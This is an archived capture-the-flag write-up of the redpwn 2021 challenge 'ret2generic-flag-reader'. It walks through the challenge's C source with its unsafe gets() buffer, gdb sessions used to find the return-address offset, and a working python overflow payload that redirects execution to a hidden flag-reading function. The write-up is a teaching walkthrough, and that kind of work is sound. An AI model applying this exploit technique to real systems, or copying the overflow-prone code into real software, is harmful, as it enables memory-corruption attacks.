# ret2generic-flag-reader

**CTF:** redpwn 2021  
**Category:** pwn  
**Original writeup:** <https://blog.pipeframe.xyz/post/redpwn2021> — by **blog.pipeframe.xyz**. All credit goes to the original author; this is an archived copy.

---

pwn/ret2generic-flag-reader

This was the second binary exploitation challenge I tackled, and it went much better than the first because I (sort of) knew what I was doing by now.

I figured the ‘ret2’ part of the title challenge was short for ‘return to’, and my suspicion was confirmed after looking at the c source:

#include <stdio.h> #include <string.h> #include <stdlib.h> void super_generic_flag_reading_function_please_ret_to_me () { char flag [ 0x100 ] = { 0 }; FILE * fp = fopen ( "./flag.txt" , "r" ); if ( ! fp ) { puts ( "no flag!! contact a member of rob inc" ); exit ( - 1 ); } fgets ( flag , 0xff , fp ); puts ( flag ); fclose ( fp ); } int main ( void ) { char comments_and_concerns [ 32 ]; setbuf ( stdout , NULL ); setbuf ( stdin , NULL ); setbuf ( stderr , NULL ); puts ( "alright, the rob inc company meeting is tomorrow and i have to come up with a new pwnable..." ); puts ( "how about this, we'll make a generic pwnable with an overflow and they've got to ret to some flag reading function!" ); puts ( "slap on some flavortext and there's no way rob will fire me now!" ); puts ( "this is genius!! what do you think?" ); gets ( comments_and_concerns ); }

With my newfound knowledge of binary exploitation, I figured I would have to overwrite the return pointer on the stack somehow, so the program calls the super_generic_flag_reading_function_please_ret_to_me function that isn’t called at all in the original.

The only input we have control over is again a call to gets();

Let’s look at the disassembly in gdb:

(gdb) disas main Dump of assembler code for function main: 0x00000000004013f4 <+79>: call 0x4010a0 <puts@plt> 0x00000000004013f9 <+84>: lea rdi,[rip+0xca0] # 0x4020a0 0x0000000000401400 <+91>: call 0x4010a0 <puts@plt> 0x0000000000401405 <+96>: lea rdi,[rip+0xd0c] # 0x402118 0x000000000040140c <+103>: call 0x4010a0 <puts@plt> 0x0000000000401411 <+108>: lea rdi,[rip+0xd48] # 0x402160 0x0000000000401418 <+115>: call 0x4010a0 <puts@plt> 0x000000000040141d <+120>: lea rax,[rbp-0x20] 0x0000000000401421 <+124>: mov rdi,rax 0x0000000000401424 <+127>: call 0x4010e0 <gets@plt> 0x0000000000401429 <+132>: mov eax,0x0 0x000000000040142e <+137>: leave 0x000000000040142f <+138>: ret End of assembler dump.

We see again multiple calls to <puts@plt> and right after a call to <gets@plt> . There is no cmp and jne to be found in this challenge though.

The goal is to overwrite the return address. This is a memory address also stored in memory, and the program will move execution to that memory address once it sees a ret instruction. In this ‘vanilla’ state, the return address always goes to the assembly equivalent of an exit() function. Let’s see if we can overwrite it by giving too much input:

(gdb) break *0x000000000040142f Breakpoint 1 at 0x40142f (gdb) run < <(python3 -c "print('a' * 56)") -- Breakpoint 1 hit -- (gdb) info registers rax 0x0 0x0 rbx 0x401430 0x401430 rsi 0x7ffff7f7d883 0x7ffff7f7d883 rdi 0x7ffff7f804e0 0x7ffff7f804e0 rbp 0x6161616161616161 0x6161616161616161 rsp 0x7fffffffd898 0x7fffffffd898 rip 0x40142f 0x40142f <main+138>

As you can see, the $rbp register is completely overwritten with 0x61 ’s. Let’s check the $rsp register to see where the main() function tries to go after ret :

(gdb) run Starting program: ret2generic-flag-reader alright, the rob inc company meeting is tomorrow and i have to come up with a new pwnable... how about this, we'll make a generic pwnable with an overflow and they've got to ret to some flag reading function! slap on some flavortext and there's no way rob will fire me now! this is genius!! what do you think? a0a1a2a3a4a5a6a7a8a9b0b1b2b3b4b5b6b7b8b9c0c1c2c3 -- Breakpoint 1 hit -- (gdb) x/1gx $rsp 0x7fffffffd898: 0x3363326331633063

Let’s use CyberChef to see what 0x3363326331633063 is in ascii!

Hmm, it’s backwards. Let’s reverse it!

Let’s find the address of the super generic flag reading function with gdb.

(gdb) print super_generic_flag_reading_function_please_ret_to_me $2 = {<text variable, no debug info>} 0x4011f6 <super_generic_flag_reading_function_please_ret_to_me>

Now we’re ready to craft a string that exploits the program and runs the secret function!

a0a1a2a3a4a5a6a7a8a9b0b1b2b3b4b5b6b7b8b9c0c1c2c3 <- original c0c1c2c3 <- ends up in $rsp aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa <- padding ( 0x28 * 'a' ) c 0 c 1 c 2 c 3 <- ends up in $rsp 3 c 2 c 1 c 0 c <- reverse 0x3363326331633063 <- reverse (hex) 0x00000000004011f6 <- pointer we want in $rsp f611400000000000 <- reverse \xf6\x11\x40\x00\x00\x00\x00\x00 <- python bytestring exploit string: b'a' * 0x28 + b'\xf6\x11\x40\x00\x00\x00\x00\x00'

Now let’s try it in an environment-less shell:

python3 -c "import sys; sys.stdout.buffer.write(b'a' * 0x28 + b'\xf6\x11\x40\x00\x00\x00\x00\x00')" | ./ret2generic-flag-reader alright, the rob inc company meeting is tomorrow and i have to come up with a new pwnable... how about this, we'll make a generic pwnable with an overflow and they've got to ret to some flag reading function! slap on some flavortext and there's no way rob will fire me now! this is genius!! what do you think? flag{this_is_a_dummy_flag_go_solve_it_yourself} Segmentation fault (core dumped) sh-5.1$
